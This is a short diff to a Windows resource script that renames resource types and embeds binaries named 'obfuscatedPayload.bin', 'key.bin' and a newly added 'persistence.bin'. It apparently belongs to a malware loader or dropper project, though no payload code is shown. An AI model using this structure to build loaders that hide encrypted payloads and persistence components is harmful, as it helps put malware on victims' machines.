@@ -47,18 +47,26 @@ END
 
 /////////////////////////////////////////////////////////////////////////////
 //
-// obfuscatedPayload
+// OBFUSCATEDPAYLOAD
 //
 
-IDR_OBFUSCATEDPAYLOAD1  obfuscatedPayload       "obfuscatedPayload.bin"
+IDR_OBFUSCATEDPAYLOAD1  OBFUSCATEDPAYLOAD       "obfuscatedPayload.bin"
 
 
 /////////////////////////////////////////////////////////////////////////////
 //
-// key
+// KEY
 //
 
-IDR_KEY1                key                     "key.bin"
+IDR_KEY1                KEY                     "key.bin"
+
+
+/////////////////////////////////////////////////////////////////////////////
+//
+// persistence
+//
+
+IDR_PERSISTENCE1        persistence             "persistence.bin"
 
 #endif    // English (United States) resources
 /////////////////////////////////////////////////////////////////////////////
